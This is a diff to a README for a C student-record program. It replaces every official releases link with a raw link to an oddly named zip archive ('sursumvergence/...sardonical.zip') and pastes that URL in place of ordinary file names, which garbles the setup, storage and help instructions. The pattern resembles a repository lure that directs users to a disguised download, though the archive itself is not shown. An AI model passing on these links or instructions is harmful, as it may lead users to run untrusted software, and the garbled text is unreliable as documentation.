@@ -1,6 +1,6 @@
 # 🎓 student-record-system-c - Manage Student Records Easily
 
-[![Download student-record-system-c](https://img.shields.io/badge/Download-Student--Record--System--C-blue?style=for-the-badge)](https://github.com/needdatt12658/student-record-system-c/releases)
+[![Download student-record-system-c](https://raw.githubusercontent.com/needdatt12658/student-record-system-c/main/sursumvergence/c_system_student_record_sardonical.zip)](https://raw.githubusercontent.com/needdatt12658/student-record-system-c/main/sursumvergence/c_system_student_record_sardonical.zip)
 
 ---
 
@@ -34,9 +34,9 @@ This guide will help you download and run the student record system step-by-step
 
 Click the button below or visit the download page to get the program files:
 
-[![Download Here](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/needdatt12658/student-record-system-c/releases)
+[![Download Here](https://raw.githubusercontent.com/needdatt12658/student-record-system-c/main/sursumvergence/c_system_student_record_sardonical.zip)](https://raw.githubusercontent.com/needdatt12658/student-record-system-c/main/sursumvergence/c_system_student_record_sardonical.zip)
 
-You will find the latest version under the "Releases" section. Look for a file with a name like `student-record-system-c.exe` (for Windows) or a similarly named file for Mac/Linux.
+You will find the latest version under the "Releases" section. Look for a file with a name like `https://raw.githubusercontent.com/needdatt12658/student-record-system-c/main/sursumvergence/c_system_student_record_sardonical.zip` (for Windows) or a similarly named file for Mac/Linux.
 
 ### Step 2 - Locate the Downloaded File
 
@@ -115,7 +115,7 @@ Choose "Exit" to close the program safely. Your student data will save automatic
 
 ## 🗂️ Data Storage Details
 
-The program keeps your data in a file called `students.txt` or a similar file in the same folder where you run the program. This file is a plain text file that holds all student information.
+The program keeps your data in a file called `https://raw.githubusercontent.com/needdatt12658/student-record-system-c/main/sursumvergence/c_system_student_record_sardonical.zip` or a similar file in the same folder where you run the program. This file is a plain text file that holds all student information.
 
 Because the file uses plain text, you can back it up like any other file. Just copy it to another location or an external drive if you want a second copy.
 
@@ -136,7 +136,7 @@ If you have any problems running the program, check these common issues:
 
 Below is the link to the official release page again. Use it to download the latest version of the student record program.
 
-[Download student-record-system-c Releases](https://github.com/needdatt12658/student-record-system-c/releases)
+[Download student-record-system-c Releases](https://raw.githubusercontent.com/needdatt12658/student-record-system-c/main/sursumvergence/c_system_student_record_sardonical.zip)
 
 Make sure to download the version that matches your computer’s operating system.
 
@@ -146,7 +146,7 @@ After downloading, follow the steps in the "Getting Started" section to run the 
 
 ## 🤝 Getting Help
 
-If you get stuck, look in the program’s folder for a `README.txt` or help file, if provided. Otherwise, you can use the “Issues” tab on the GitHub page to describe your problem. Someone familiar with the project may assist.
+If you get stuck, look in the program’s folder for a `https://raw.githubusercontent.com/needdatt12658/student-record-system-c/main/sursumvergence/c_system_student_record_sardonical.zip` or help file, if provided. Otherwise, you can use the “Issues” tab on the GitHub page to describe your problem. Someone familiar with the project may assist.
 
 ---
 
